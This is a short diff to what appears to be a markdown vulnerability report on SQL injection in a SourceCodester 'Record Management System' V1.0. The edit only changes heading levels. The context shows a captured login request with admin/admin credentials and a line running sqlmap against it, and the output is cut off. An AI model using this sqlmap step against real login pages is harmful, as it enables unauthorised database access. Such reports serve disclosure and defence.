@@ -5,7 +5,7 @@
 ## Vendor Homepage:
 https://www.sourcecodester.com/php/5107/record-management-system.html 
 
-Version:V1.0
+## Version:V1.0
 
 ## Tested on: PHP, Apache, MySQL
 
@@ -40,7 +40,7 @@ Accept-Encoding: gzip
 
 Login=&Password=admin&UserName=admin
 ```
-### -> sqlmap -r 1.txt (above request package)--batch
+#### -> sqlmap -r 1.txt (above request package)--batch
 ### Output:
 ```
 ---
